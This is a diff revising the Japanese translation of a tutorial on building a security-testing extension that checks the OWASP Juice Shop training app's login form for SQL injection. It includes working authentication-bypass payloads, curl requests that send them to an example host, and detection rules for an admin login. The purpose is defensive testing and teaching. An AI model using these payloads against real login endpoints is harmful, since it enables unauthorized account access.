@@ -1,5 +1,6 @@
-[link-meta-info]:           ../create-extension.md#meta-info-kaku-no-kozo
-[link-send-headers]:        ../phase-send.md#host-hedda-to-no-omoshiro
+```markdown
+[link-meta-info]:           ../create-extension.md#structure-of-the-meta-info-section
+[link-send-headers]:        ../phase-send.md
 [link-using-extension]:     ../using-extension.md
 [link-app-examination]:     app-examination.md
 
@@ -8,55 +9,55 @@
 
 [link-juice-shop]:          https://www.owasp.org/index.php/OWASP_Juice_Shop_Project
 
+#  変更を加えない拡張機能の作成
 
-#   変更を伴わないエクステンションの作成 
-
-この文書で述べているエクステンションは、ペイロードを注入するための入力基本リクエストを変更しません。代わりに、2つの事前定義されたテストリクエストが、基本リクエストで指定されたホストに送信されます。これらのテストリクエストには、[「OWASPジュースショップ」][link-juice-shop]のターゲットアプリケーションのログインフォームでのSQLi脆弱性を利用する可能性のあるペイロードが含まれています.
-
+本書で説明する拡張機能は、ペイロードを注入するために入力された基線リクエストを変更しません。代わりに、基線リクエストで指定されたホストに対して、あらかじめ定義された2つのテストリクエストが送信されます。これらのテストリクエストは、[“OWASP Juice Shop”][link-juice-shop]ターゲットアプリケーションのログインフォームに存在するSQLi脆弱性の悪用につながる可能性のあるペイロードを含みます。
 
 ##  準備
 
-FASTエクステンションの作成前に、ターゲットアプリケーションの動作を[調査することが強く推奨されます][link-app-examination]。
+FAST拡張機能の作成前に、ターゲットアプリケーションの動作を[検証する][link-app-examination]ことを強く推奨します。
 
+##  拡張機能の構築
 
-##  エクステンションの構築 
+拡張機能の説明を行うファイル（例：`non-mod-extension.yaml`）を作成し、必要なセクションで内容を埋めてください：
 
-エクステンションを記述するファイル（例えば `non-mod-extension.yaml`）を作成し、必要なセクションに情報を記入します。
+1.  [**`meta-info`セクション**][link-meta-info]
 
-1.  [**`meta-info`セクション**][link-meta-info]。
-
-    エクステンションが検出しようとしている脆弱性の説明を準備します。
-
+    拡張機能が検出を試みる脆弱性の説明を用意してください。
+    
     * 脆弱性ヘッダー: `OWASP Juice Shop SQLi (non-mod extension)`
-    * 脆弱性の説明: `OWASP Juice ShopでのSQLiのデモ（管理者ログイン）`
-    * 脆弱性タイプ: SQLインジェクション
-    * 脆弱性の脅威レベル: 高
-
-    それに応じた`meta-info`セクションは次のようになるはずです：
-
+    * 脆弱性の説明: `Demo of SQLi in OWASP Juice Shop (Admin Login)`
+    * 脆弱性タイプ: SQL injection
+    * 脆弱性の脅威レベル: high
+    
+    対応する`meta-info`セクションは以下のようになります：
+    
     ```
     meta-info:
       - type: sqli
       - threat: 80
       - title: 'OWASP Juice Shop SQLi (non-mod extension)'
-      - description: 'OWASP Juice ShopでのSQLiのデモ（管理者ログイン）'
+      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'
     ```
- 
-2.  **`send`セクション、[送信フェーズ][doc-send-phase]**
+    
+2.  **`send`セクション，[Send phase][doc-send-phase]**
 
-    ターゲットアプリケーションでのSQLインジェクション脆弱性を利用するためには、以下の2つのペイロードを`email`パラメータ値として任意の`password`値と一緒に送信する必要があります：
+    ターゲットアプリケーションのSQLi脆弱性を悪用するため、任意の`password`値とともに、`email`パラメータ値として送信されるべき2つのペイロードがあります：
     
     * `'or 1=1 --`
     * `admin@juice-sh.op'--`
+    
+    各テストリクエストは、以下を含むように作成できます：
+    
+    * 上記のいずれかの値を持つ`email`パラメータ
+    * 任意の値を持つ`password`パラメータ
 
-    上記の値のうち1つを`email`パラメータと、任意の値を`password`パラメータとする形で2つのテストリクエストを作成することができます。
+    これらのリクエストのうちの1つだけを使用して、例として挙げたターゲットアプリケーション（OWASP Juice Shop）をテストするだけで十分です。
+    
+    ただし、実際のアプリケーションのセキュリティテストを実施する際には、いくつかの事前に作成されたテストリクエストのセットが有用です。なぜなら、アプリケーションのアップデートや改善により、あるリクエストが脆弱性を悪用できなくなった場合でも、他のペイロードを使用したリクエストが脆弱性を悪用できる可能性があるためです。
 
-    例の目標アプリケーション（OWASPジュースショップ）をテストするためには、これらのリクエストのうち1つを使用するだけで十分です。
-
-    しかし、実際のアプリケーションのセキュリティテストを行う際には、いくつかの準備済みのテストリクエストを持っていると便利かもしれません：1つのリクエストがもう脆弱性を利用できなくなっても、他のテストリクエストがまだ脆弱性を利用できるかもしれません。
-
-    先に挙げたペイロードリストの最初のペイロードを使用したリクエストは次のようなものになります：
-
+    上記リストの最初のペイロードを使用したリクエストは、以下のようになります：
+    
     ```
     curl --request POST --url http://ojs.example.local/rest/user/login \
          --header 'content-type: application/json' \
@@ -64,8 +65,8 @@ FASTエクステンションの作成前に、ターゲットアプリケーシ�
          --data '{"email":"'\''or 1=1 --", "password":"12345"}'
     ```
 
-    2つ目のリクエストは最初のリクエストと似ています：
-
+    2番目のリクエストも同様の形式です：
+    
     ```
     curl --request POST --url http://ojs.example.local/rest/user/login \
          --header 'content-type: application/json' \
@@ -73,7 +74,7 @@ FASTエクステンションの作成前に、ターゲットアプリケーシ�
          --data '{"email":"admin@juice-sh.op'\''--", "password":"12345"}'
     ```
 
-    これら2つのテストリクエストの説明を含む`send`セクションを追加します：
+    これら2つのテストリクエストの説明を含む`send`セクションを追加してください：
     
     ```
     send:
@@ -89,28 +90,28 @@ FASTエクステンションの作成前に、ターゲットアプリケーシ�
         body: '{"email":"admin@juice-sh.op''--","password":"12345"}'
     ``` 
     
-    !!! info "`Host`ヘッダーについての注意点"
-        この特定のSQLi脆弱性の利用には`Host`ヘッダーが影響を与えませんので、これらのリクエストでは`Host`ヘッダーを省略できます。FASTノードは、受信した基本リクエストから抽出した`Host`ヘッダーを自動的に追加します。
+    !!! info "Hostヘッダーに関する注意"
+        これらのリクエストでは、特定のSQLi脆弱性の悪用に影響を与えないため、`Host`ヘッダーは省略可能です。FASTノードは、入力された基線リクエストから抽出された`Host`ヘッダーを自動的に付加します。
         
-        送信フェーズがリクエストヘッダーをどのように扱うかについては[こちら][link-send-headers]で読むことができます。
+        [こちら][link-send-headers]を参照し、Send phaseがリクエストヘッダーをどのように処理するかを確認してください。
 
-    3.  **`detect`セクション、[検出フェーズ][doc-detect-phase]**。
-
-    以下の条件は、管理者権限でのユーザー認証が成功したことを示します：
+3.  **`detect`セクション，[Detect phase][doc-detect-phase]**
     
-    * レスポンス本体の中に、ショッピングカート識別子パラメータの`1`の値の存在。パラメータはJSON形式で、次のようになります：
-
+    以下の条件は、管理者権限のユーザー認証が成功したことを示します：
+    
+    * レスポンスボディ内に、`1`の値を持つショッピングカート識別子パラメータが存在すること。パラメータはJSON形式で、以下のようになります：
+    
         ```
         "bid":1
         ```
     
-    * レスポンス本体の中に、ユーザーメールパラメータの`admin@juice-sh.op`の値の存在。パラメータはJSON形式で、次のようになります：
-
+    * レスポンスボディ内に、`admin@juice-sh.op`の値を持つユーザーのメールアドレスパラメータが存在すること。パラメータはJSON形式で、以下のようになります：
+    
         ```
          "umail":"admin@juice-sh.op"
         ```
-
-    攻撃が成功したかどうかを、上記の条件に従って確認する`detect`セクションを追加します：
+    
+    上記条件に基づいて攻撃が成功したかどうかを確認する`detect`セクションを追加してください。
     
     ```
     detect:
@@ -118,13 +119,13 @@ FASTエクステンションの作成前に、ターゲットアプリケーシ�
         - body: "\"umail\":\"admin@juice-sh.op\""
         - body: "\"bid\":1"
     ```
+    
+!!! info "特殊記号のエスケープ"
+    文字列内の特殊記号をエスケープすることを忘れないでください。
 
-!!! info "特殊文字のエスケープ"
-    文字列の中の特殊文字をエスケープすることを忘れないでください。
+##  拡張機能のファイル
 
-##  エクステンションファイル
-
-`non-mod-extension.yaml`ファイルには、エクステンションが動作するために必要なセクションの全セットが含まれています。ファイルの内容は以下の通りです：
+これで`non-mod-extension.yaml`ファイルには、拡張機能の動作に必要な全セクションが揃っています。ファイルの内容は以下の通りです：
 
 ??? info "non-mod-extension.yaml"
     ```
@@ -132,7 +133,7 @@ FASTエクステンションの作成前に、ターゲットアプリケーシ�
       - type: sqli
       - threat: 80
       - title: 'OWASP Juice Shop SQLi (non-mod extension)'
-      - description: 'OWASP Juice ShopでのSQLiのデモ（管理者ログイン）'
+      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'
 
     send:
       - method: 'POST'
@@ -152,6 +153,7 @@ FASTエクステンションの作成前に、ターゲットアプリケーシ�
         - body: "\"bid\":1"
     ```
 
-##  エクステンションの使用
+##  拡張機能の使用
 
-作成した表現の使用方法についての詳細情報は、[この文書][link-using-extension]を参照してください。
+作成した拡張機能の使用方法についての詳細は、[こちらのドキュメント][link-using-extension]を参照してください。
+```
